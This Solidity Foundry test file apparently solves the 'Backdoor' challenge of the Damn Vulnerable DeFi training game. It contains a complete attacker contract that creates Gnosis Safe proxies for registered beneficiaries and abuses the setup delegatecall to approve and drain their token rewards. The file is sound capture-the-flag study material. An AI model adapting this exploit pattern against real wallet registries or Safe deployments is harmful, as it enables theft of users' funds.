// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";

import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../Contracts/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";
import {IERC20} from "openzeppelin-contracts/interfaces/IERC20.sol";

interface ProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract WalletRegistryAttacker {
    address public masterCopyAddress;
    address public walletRegistryAddress;
    ProxyFactory proxyFactory;

    constructor(
        address _proxyFactoryAddress,
        address _walletRegistryAddress,
        address _masterCopyAddress
    ) {
        proxyFactory = ProxyFactory(_proxyFactoryAddress);
        walletRegistryAddress = _walletRegistryAddress;
        masterCopyAddress = _masterCopyAddress;
    }

    // we cant delegatecall directly into the ERC20 token's approve function because the state changes would
    // apply for the proxy (set allowance, which is not present on proxy) so instead we used a hop like:
    // this.createProxyWithCallback call -> proxy delegatecall -> this.approve (msg.sender = proxy) -> erc20.approve
    function approve(address spender, address token) external {
        IERC20(token).approve(spender, type(uint256).max);
    }

    function attack(
        address tokenAddress,
        address hacker,
        address[] calldata users
    ) public {
        for (uint256 i = 0; i < users.length; i++) {
            // add the current user as the owner of the proxy
            address user = users[i];
            address[] memory owners = new address[](1);
            owners[0] = user;

            // encoded payload to approve tokens for this contract
            bytes memory encodedApprove = abi.encodeWithSignature(
                "approve(address,address)",
                address(this),
                tokenAddress
            );

            // GnossisSafe::setup function that will be called on the newly created proxy
            // pass in the approve function to to delegateCalled by the proxy into this contract
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                encodedApprove,
                address(0),
                0,
                0,
                0
            );
            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                masterCopyAddress,
                initializer,
                0,
                IProxyCreationCallback(walletRegistryAddress)
            );
            // transfer the approved tokens
            IERC20(tokenAddress).transferFrom(address(proxy), hacker, 10 ether);
        }
    }
}

contract Backdoor is DSTest, stdCheats {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 internal constant NUM_USERS = 4;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    address[] internal users;
    address payable internal attacker;
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        users = utils.createUsers(NUM_USERS);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        vm.label(address(masterCopy), "Gnosis Safe");

        walletFactory = new GnosisSafeProxyFactory();
        vm.label(address(walletFactory), "Wallet Factory");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            users
        );

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < NUM_USERS; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
        }

        // Transfer tokens to be distributed to the registry
        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // I didn't figure this one on my own and I have to give credit to:
        // https://medium.com/@balag3/damn-vulnerable-defi-walkthrough-part-two-challenge-7-12-a64c42c82c5b

        // The essence of the exploit lies in deploying wallets whose owners are addresses who are already
        // eligible for the tokens and then approving the attacker contract to spend the tokens through
        // by making the proxy contract call a function on the attacker contract through delegateCall
        // (the proxy receives the tokens)

        vm.startPrank(attacker);

        WalletRegistryAttacker attackerContract = new WalletRegistryAttacker(
            address(walletFactory),
            address(walletRegistry),
            address(masterCopy)
        );
        attackerContract.attack(address(dvt), attacker, users);

        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            if (wallet == address(0)) {
                emit log("User did not register a wallet");
                fail();
            }

            // User is no longer registered as a beneficiary
            assertTrue(!walletRegistry.beneficiaries(users[i]));
        }

        // Attacker must have taken all tokens
        assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
